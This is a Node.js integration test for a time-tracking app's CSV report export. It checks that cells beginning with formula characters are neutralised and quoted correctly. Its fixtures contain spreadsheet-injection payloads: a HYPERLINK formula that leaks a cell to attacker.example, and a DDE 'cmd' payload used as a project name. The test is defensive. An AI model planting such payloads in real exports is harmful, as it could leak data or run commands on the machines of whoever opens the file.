import assert from "node:assert/strict";
import crypto from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { after, before, test } from "node:test";
import { parseCsv, values } from "../fixtures/rfc4180.mjs";

if (!process.env.TEST_DATABASE_URL) throw new Error("Set TEST_DATABASE_URL to a migrated disposable PostgreSQL database");
Object.assign(process.env, {
  DATABASE_URL: process.env.TEST_DATABASE_URL, NODE_ENV: "test", LOG_LEVEL: "error",
  JWT_SECRET: "time-report-csv-test-signing-secret", COOKIE_SECRET: "time-report-csv-test-cookie-secret",
});
const storageDir = await mkdtemp(path.join(os.tmpdir(), "werkyn-time-report-csv-"));
process.env.STORAGE_DIR = storageDir;
const { buildApp } = await import("../../src/app.js");
const { signAccessToken } = await import("../../src/utils/tokens.js");

const BOM = "﻿";
const HEADER = ["Date", "User", "Project", "Task", "Hours", "Billable", "Rate", "Currency", "Cost", "Description"];
const NAMES = {
  ADMIN: "Admin",
  WORKER: 'Worker "A", Jr.',
  EVIL: '=HYPERLINK("http://attacker.example/?leak="&A1,"Open")',
};
const PROJECT = "-2+3+cmd|' /C calc'!A0";
const TASK = "@SUM(1,2)\r\nsecond line, \"quoted\"";

let app, workspace, project, task;
const users = {}, tokens = {};
let requests = 0;
const req = (actor, method, url, payload) => app.inject({
  method, url, payload, headers: { authorization: `Bearer ${tokens[actor]}` },
  remoteAddress: `10.72.${Math.floor(++requests / 250)}.${requests % 250 + 1}`,
});
const exportUrl = (query = "") => `/api/workspaces/${workspace.id}/time/reports/export?startDate=2026-04-01&endDate=2026-04-30${query}`;

// Each entry is logged through the API; expected cells are the exact text a
// spreadsheet should show (formula-leading text gains an apostrophe).
const fixtures = [
  { actor: "WORKER", body: { date: "2026-04-01", hours: 1.5, description: 'Café, "quoted"\nnext line 日本語 \u{1F600}' },
    row: ["2026-04-01", 'Worker "A", Jr.', "'" + PROJECT, "", "1.50", "Yes", "12.50", "EUR", "18.75", 'Café, "quoted"\nnext line 日本語 \u{1F600}'] },
  { actor: "WORKER", body: { date: "2026-04-02", hours: 2, description: "+1+1", task: true },
    row: ["2026-04-02", 'Worker "A", Jr.', "'" + PROJECT, "'" + TASK, "2.00", "Yes", "12.50", "EUR", "25.00", "'+1+1"] },
  { actor: "WORKER", body: { date: "2026-04-03", hours: 0.25, description: "-5", billable: false },
    row: ["2026-04-03", 'Worker "A", Jr.', "'" + PROJECT, "", "0.25", "No", "12.50", "EUR", "0.00", "'-5"] },
  { actor: "EVIL", body: { date: "2026-04-04", hours: 3, description: "\t=1+1\r\n" },
    row: ["2026-04-04", "'" + NAMES.EVIL, "'" + PROJECT, "", "3.00", "Yes", "", "", "", "'\t=1+1\r\n"] },
  { actor: "EVIL", body: { date: "2026-04-05", hours: 1, description: "@cmd" },
    row: ["2026-04-05", "'" + NAMES.EVIL, "'" + PROJECT, "", "1.00", "Yes", "", "", "", "'@cmd"] },
  { actor: "EVIL", body: { date: "2026-04-06", hours: 1, projectless: true },
    row: ["2026-04-06", "'" + NAMES.EVIL, "", "", "1.00", "Yes", "", "", "", ""] },
];

before(async () => {
  app = await buildApp(); await app.ready();
  app.broadcast = () => {};
  const suffix = crypto.randomUUID().slice(0, 20);
  for (const [actor, displayName] of Object.entries(NAMES)) {
    users[actor] = await app.prisma.user.create({ data: {
      email: `time-csv-${actor}-${suffix}@example.test`, displayName, emailVerified: true,
    } });
    tokens[actor] = signAccessToken({ sub: users[actor].id, email: users[actor].email });
  }
  workspace = await app.prisma.workspace.create({ data: { name: "Time report CSV", slug: `tcsv-${suffix}`, members: { create: [
    { userId: users.ADMIN.id, role: "ADMIN" }, { userId: users.WORKER.id, role: "MEMBER" }, { userId: users.EVIL.id, role: "MEMBER" },
  ] } } });
  project = await app.prisma.project.create({ data: {
    workspaceId: workspace.id, name: PROJECT,
    members: { create: [users.WORKER.id, users.EVIL.id].map((userId) => ({ userId })) },
  } });
  const status = await app.prisma.statusColumn.create({ data: { projectId: project.id, name: "Open" } });
  task = await app.prisma.task.create({ data: { projectId: project.id, statusId: status.id, title: TASK } });
  const rate = await req("ADMIN", "POST", `/api/workspaces/${workspace.id}/time/rates/${users.WORKER.id}`, {
    rate: 12.5, currency: "EUR", effectiveFrom: "2026-01-01",
  });
  assert.equal(rate.statusCode, 200, rate.body);
  for (const { actor, body: { task: withTask, projectless, ...body } } of fixtures) {
    const response = await req(actor, "POST", `/api/workspaces/${workspace.id}/time/entries`, {
      billable: true, ...body, ...(projectless ? {} : withTask ? { taskId: task.id } : { projectId: project.id }),
    });
    assert.equal(response.statusCode, 201, response.body);
  }
});

after(async () => {
  try {
    if (app && workspace) {
      await app.prisma.timeEntry.deleteMany({ where: { workspaceId: workspace.id } });
      await app.prisma.task.deleteMany({ where: { projectId: project?.id } });
      await app.prisma.workspace.deleteMany({ where: { id: workspace.id } });
      await app.prisma.user.deleteMany({ where: { id: { in: Object.values(users).map((user) => user.id) } } });
    }
  } finally { await app?.close(); await rm(storageDir, { recursive: true, force: true }); }
});

async function download(query) {
  const response = await req("ADMIN", "GET", exportUrl(query));
  assert.equal(response.statusCode, 200, response.body);
  return response;
}

test("every exported cell survives a strict RFC 4180 round trip with formulas neutralised", async () => {
  const response = await download();
  assert.equal(response.headers["content-type"], "text/csv; charset=utf-8");
  assert.equal(response.headers["content-disposition"], "attachment; filename=time-report.csv");
  // The raw bytes are UTF-8 with a byte order mark so spreadsheets keep non-ASCII text.
  assert.deepEqual([...response.rawPayload.subarray(0, 3)], [0xef, 0xbb, 0xbf]);
  assert(response.body.startsWith(BOM));
  const records = parseCsv(response.body.slice(BOM.length));
  const [header, ...rows] = values(records);
  assert.deepEqual(header, HEADER);
  const byDate = (a, b) => (a[0] < b[0] ? -1 : 1);
  assert.deepEqual(rows.sort(byDate), fixtures.map(({ row }) => row));
});

test("numbers and dates are bare and every text cell is quoted", async () => {
  const records = parseCsv((await download()).body.slice(BOM.length));
  for (const record of records.slice(1)) {
    record.forEach((field, column) => {
      const bare = ["Date", "Hours", "Rate", "Cost"].includes(HEADER[column]);
      if (bare) assert.equal(field.quoted, false, `${HEADER[column]} ${field.value}`);
      else assert.equal(field.quoted, field.value !== "", `${HEADER[column]} ${JSON.stringify(field.value)}`);
      if (HEADER[column] === "Date") assert.match(field.value, /^\d{4}-\d{2}-\d{2}$/);
      else if (bare && field.value !== "") assert.match(field.value, /^-?\d+\.\d\d$/);
    });
  }
  for (const record of records) {
    for (const { value } of record) {
      assert.doesNotMatch(value, /^[=+\-@\t\r\n＝＋－＠]/u, `formula-leading cell ${JSON.stringify(value)}`);
    }
  }
});

test("filters, grouping and the admin-only boundary are unchanged", async () => {
  const grouped = parseCsv((await download("&groupBy=project&billable=false")).body.slice(BOM.length));
  assert.deepEqual(values(grouped).slice(1), [fixtures[2].row]);
  for (const actor of ["WORKER", "EVIL"]) {
    assert.equal((await req(actor, "GET", exportUrl())).statusCode, 403);
  }
});
